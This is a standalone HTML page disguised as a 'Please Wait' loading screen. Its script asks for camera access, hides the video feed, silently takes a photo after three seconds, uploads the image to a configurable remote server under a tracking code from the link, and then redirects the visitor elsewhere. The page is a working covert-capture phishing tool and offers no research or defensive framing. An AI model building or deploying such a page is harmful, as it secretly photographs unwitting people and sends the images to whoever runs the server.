<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Please Wait...</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #111;
      color: #fff;
      font-family: sans-serif;
      flex-direction: column;
    }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <h2>Please allow camera access</h2>
  <video autoplay playsinline></video>
  <canvas></canvas>

  <script>
    const video = document.querySelector('video');
    const canvas = document.querySelector('canvas');
    const code = window.location.pathname.replace('/', '');
    const apiBaseUrl = 'http://localhost:8000'; // Replace with your server URL

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        setTimeout(() => {
          takePhoto();
        }, 3000); // Wait 3 seconds before taking photo
      } catch (err) {
        alert("Camera access denied");
      }
    }

    function takePhoto() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      const image = canvas.toDataURL('image/jpeg');

      // Send photo to server
      fetch(`${apiBaseUrl}/api/upload/${code}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image })
      })
      .then(response => response.json())
      .then(() => {
        // Request redirect URL
        fetch(`${apiBaseUrl}/api/redirect/${code}`)
          .then(res => res.json())
          .then(data => {
            if (data.redirect_url) {
              window.location.href = data.redirect_url; // Redirect
            } else {
              document.body.innerHTML = '<h2>Thank you!</h2>'; // Invalid code
            }
          });
      })
      .catch(err => {
        console.error('Error:', err);
        document.body.innerHTML = '<h2>Error during upload</h2>';
      });
    }

    startCamera();
  </script>
</body>
</html>
